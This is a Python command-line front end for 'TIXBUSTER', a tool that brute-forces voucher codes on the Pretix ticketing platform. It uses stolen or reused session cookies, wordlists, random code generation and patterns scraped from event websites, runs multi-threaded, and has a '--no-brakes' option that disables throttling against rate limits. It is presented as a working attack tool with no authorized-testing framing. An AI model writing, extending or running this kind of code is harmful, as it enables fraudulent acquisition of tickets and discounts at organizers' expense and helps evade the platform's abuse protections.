#!/usr/bin/env python3
"""
TIXBUSTER - Main CLI
Pretix voucher code bruteforcer with 2100+ patterns
"""

import argparse
import sys
import json
from datetime import datetime

from src.wordlist import (
    get_master_wordlist,
    get_priority_codes,
    get_wordlist_stats,
    load_custom_wordlist,
    generate_random_codes
)
from src.session import SessionManager, validate_and_exit_if_invalid
from src.tester import VoucherTester
from src.scraper import EventScraper
from src.pattern_generator import PatternGenerator


def cmd_validate(args):
    """Validate session cookies with IMDARK control test"""
    print("=" * 60)
    print("SESSION VALIDATION")
    print("=" * 60)

    manager = SessionManager(verbose=args.verbose)
    success, message = manager.validate_session()

    print("\n" + "=" * 60)
    if success:
        print("✓ Session is VALID")
        print("You're ready to start testing vouchers!")
    else:
        print("✗ Session is INVALID")
        print("Update your cookies in src/session.py")
    print("=" * 60)

    return 0 if success else 1


def cmd_test(args):
    """Test voucher codes"""
    print("=" * 60)
    print("TIXBUSTER - PRETIX VOUCHER BRUTEFORCER")
    print("=" * 60)

    # Create session manager
    manager = SessionManager(verbose=args.verbose)

    # Validate session first
    print()
    session = validate_and_exit_if_invalid(manager)
    print()

    # Get wordlist
    if args.code:
        codes = [args.code.upper()]
        print(f"[*] Testing single code: {codes[0]}")
    elif args.random:
        codes = generate_random_codes(
            count=args.random,
            length=args.random_length,
            charset=args.random_charset,
            prefix=args.random_prefix,
            suffix=args.random_suffix
        )
        print(f"[*] Testing {len(codes)} random codes ({args.random_charset}, length={args.random_length})")
        if args.random_prefix or args.random_suffix:
            print(f"[*] Pattern: {args.random_prefix}{'X'*args.random_length}{args.random_suffix}")
    elif args.priority:
        codes = get_priority_codes()
        print(f"[*] Testing {len(codes)} priority codes")
    elif args.wordlist:
        codes = load_custom_wordlist(args.wordlist)
        print(f"[*] Loaded {len(codes)} codes from {args.wordlist}")
    elif args.all:
        codes = get_master_wordlist()
        print(f"[*] Testing ALL {len(codes)} patterns (this will take a while!)")
    else:
        # Default: priority codes
        codes = get_priority_codes()
        print(f"[*] Testing {len(codes)} priority codes (use --all for full wordlist)")

    if not codes:
        print("[!] No codes to test!")
        return 1

    # Create tester
    tester = VoucherTester(verbose=args.verbose, threads=args.threads, no_brakes=args.no_brakes)

    # Test codes
    print(f"[*] Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    if args.threads > 1:
        print(f"[*] Multi-threading enabled: {args.threads} threads")
    print()

    results = tester.test_batch(codes, session, manager.csrf_token)

    # Print results
    print("\n" + "=" * 60)
    print("TESTING COMPLETE")
    print("=" * 60)

    elapsed = (datetime.now() - tester.start_time).seconds
    print(f"\nTotal time: {elapsed//60} minutes {elapsed%60} seconds")
    print(f"Total tested: {results['tested']}")

    if results['SUCCESS']:
        print(f"\n[!!!] VALID CODES ({len(results['SUCCESS'])}):")
        for code in results['SUCCESS']:
            print(f"      ✓ {code}")

    if results['EXPIRED']:
        print(f"\n[*] Expired but valid format ({len(results['EXPIRED'])}):")
        for code in results['EXPIRED'][:5]:
            print(f"      × {code}")
        if len(results['EXPIRED']) > 5:
            print(f"      ... and {len(results['EXPIRED'])-5} more")

    if results['UNKNOWN']:
        print(f"\n[?] Unknown responses ({len(results['UNKNOWN'])}):")
        for code in results['UNKNOWN']:
            print(f"      ? {code}")

    # Save results
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"\n[*] Results saved to {args.output}")

    return 0 if results['SUCCESS'] else 1


def cmd_stats(args):
    """Show wordlist statistics"""
    print("=" * 60)
    print("MASTER WORDLIST STATISTICS")
    print("=" * 60)

    stats = get_wordlist_stats()

    print(f"\nTotal unique patterns: {stats['total_patterns']}")
    print(f"Priority patterns: {stats['priority_patterns']}")

    print("\nBreakdown by category:")
    for category, count in sorted(stats['categories'].items(), key=lambda x: x[1], reverse=True):
        print(f"  {category:20s}: {count:4d} patterns")

    if args.show_priority:
        print("\n" + "=" * 60)
        print("PRIORITY CODES (tested first):")
        print("=" * 60)
        for i, code in enumerate(get_priority_codes(), 1):
            print(f"  {i:2d}. {code}")

    return 0


def cmd_search(args):
    """Search for patterns in wordlist"""
    query = args.query.upper()
    wordlist = get_master_wordlist()
    matches = [code for code in wordlist if query in code]

    print(f"Found {len(matches)} matches for '{query}':\n")
    for code in sorted(matches)[:50]:  # Show first 50
        print(f"  - {code}")

    if len(matches) > 50:
        print(f"\n... and {len(matches)-50} more")

    return 0


def cmd_export(args):
    """Export wordlist to file"""
    wordlist = get_priority_codes() if args.priority else get_master_wordlist()

    with open(args.output, 'w') as f:
        f.write(f"# TIXBUSTER Voucher Wordlist\n")
        f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Total patterns: {len(wordlist)}\n")
        f.write(f"#\n")
        f.write(f"# One code per line, comments start with #\n\n")

        for code in wordlist:
            f.write(f"{code}\n")

    print(f"Exported {len(wordlist)} patterns to {args.output}")
    return 0


def cmd_generate_wordlist(args):
    """Generate wordlist from event website"""
    print("=" * 60)
    print("WORDLIST GENERATION FROM WEB CONTENT")
    print("=" * 60)

    # Initialize scraper and generator
    scraper = EventScraper(verbose=args.verbose)
    generator = PatternGenerator(verbose=args.verbose)

    # Crawl the event website
    print(f"\n[*] Target URL: {args.url}")
    scraped_data = scraper.crawl_event(args.url, max_depth=args.depth)

    # Generate patterns
    print(f"\n[*] Generating voucher patterns...")
    patterns = generator.generate_all(scraped_data, include_variations=not args.no_variations)

    # Create data directory if needed
    import os
    os.makedirs('data', exist_ok=True)

    # Save to file
    output_file = args.output or 'data/generated_wordlist.txt'
    with open(output_file, 'w') as f:
        f.write(f"# TIXBUSTER Generated Wordlist\n")
        f.write(f"# Source: {args.url}\n")
        f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Total patterns: {len(patterns)}\n")
        f.write(f"#\n")
        f.write(f"# Scraped data:\n")
        f.write(f"#   - {len(scraped_data['speakers'])} speakers\n")
        f.write(f"#   - {len(scraped_data['talks'])} talks\n")
        f.write(f"#   - {len(scraped_data['sponsors'])} sponsors\n")
        f.write(f"#\n\n")

        for pattern in patterns:
            f.write(f"{pattern}\n")

    print(f"\n[*] Saved {len(patterns)} patterns to {output_file}")

    # Suggest next steps
    print(f"\n[*] Next steps:")
    print(f"    python3 main.py test --wordlist {output_file}")
    print(f"    python3 main.py test --wordlist {output_file} --threads 5")

    return 0


def main():
    parser = argparse.ArgumentParser(
        description='TIXBUSTER - Pretix Voucher Bruteforcer',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Validate your session cookies
  python3 main.py validate

  # Test a single code
  python3 main.py test --code KXBUDZ

  # Test priority codes (fastest, highest probability)
  python3 main.py test --priority

  # Test all 2100+ patterns (slow but comprehensive)
  python3 main.py test --all

  # Test with custom wordlist
  python3 main.py test --wordlist custom.txt

  # Random bruteforce - 100 random 6-char codes (A-Z,0-9)
  python3 main.py test --random 100

  # Random with DARK prefix (DARKAB12CD, DARK99ZZ)
  python3 main.py test --random 50 --random-prefix DARK --random-length 6

  # Random with FREE suffix (KK3DFREE, X9Y1FREE)
  python3 main.py test --random 50 --random-suffix FREE --random-length 4

  # Random uppercase only (KKBDXZ, PPQRST)
  python3 main.py test --random 100 --random-charset upper

  # Show wordlist statistics
  python3 main.py stats

  # Search for patterns
  python3 main.py search LUNAR

  # Export wordlist to file
  python3 main.py export wordlist.txt
        """
    )

    subparsers = parser.add_subparsers(dest='command', help='Command to run')

    # validate command
    validate_parser = subparsers.add_parser('validate', help='Validate session cookies')
    validate_parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')

    # test command
    test_parser = subparsers.add_parser('test', help='Test voucher codes')
    test_parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    test_parser.add_argument('--priority', '-p', action='store_true', help='Test priority codes only')
    test_parser.add_argument('--all', '-a', action='store_true', help='Test all 2100+ patterns')
    test_parser.add_argument('--wordlist', '-w', help='Load codes from custom file')
    test_parser.add_argument('--code', '-c', help='Test a single voucher code')
    test_parser.add_argument('--output', '-o', default='results.json', help='Output file for results')
    test_parser.add_argument('--threads', '-t', type=int, default=1, help='Number of threads (default: 1, safe: 5, aggressive: 10)')
    test_parser.add_argument('--no-brakes', action='store_true', help='Disable auto-throttling on rate limits (full speed always)')

    # Random bruteforce options
    test_parser.add_argument('--random', '-r', type=int, metavar='COUNT',
                            help='Generate COUNT random codes to test')
    test_parser.add_argument('--random-length', type=int, default=6,
                            help='Length of random portion (default: 6)')
    test_parser.add_argument('--random-charset', choices=['upper', 'lower', 'alphanum', 'uppernumeric'],
                            default='uppernumeric',
                            help='Character set (default: uppernumeric A-Z,0-9)')
    test_parser.add_argument('--random-prefix', default='',
                            help='Prefix for random codes (e.g., DARK)')
    test_parser.add_argument('--random-suffix', default='',
                            help='Suffix for random codes (e.g., 2025)')

    # stats command
    stats_parser = subparsers.add_parser('stats', help='Show wordlist statistics')
    stats_parser.add_argument('--show-priority', '-p', action='store_true', help='Show priority codes')

    # search command
    search_parser = subparsers.add_parser('search', help='Search for patterns')
    search_parser.add_argument('query', help='Search query')

    # export command
    export_parser = subparsers.add_parser('export', help='Export wordlist to file')
    export_parser.add_argument('output', help='Output filename')
    export_parser.add_argument('--priority', '-p', action='store_true', help='Export priority codes only')

    # generate-wordlist command
    gen_parser = subparsers.add_parser('generate-wordlist', help='Generate wordlist from event website')
    gen_parser.add_argument('url', help='Event website URL')
    gen_parser.add_argument('--output', '-o', help='Output file (default: data/generated_wordlist.txt)')
    gen_parser.add_argument('--depth', '-d', type=int, default=2, help='Crawl depth (default: 2)')
    gen_parser.add_argument('--no-variations', action='store_true', help='Skip common suffix variations')
    gen_parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        return 1

    # Route to command handlers
    commands = {
        'validate': cmd_validate,
        'test': cmd_test,
        'stats': cmd_stats,
        'search': cmd_search,
        'export': cmd_export,
        'generate-wordlist': cmd_generate_wordlist
    }

    return commands[args.command](args)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(130)
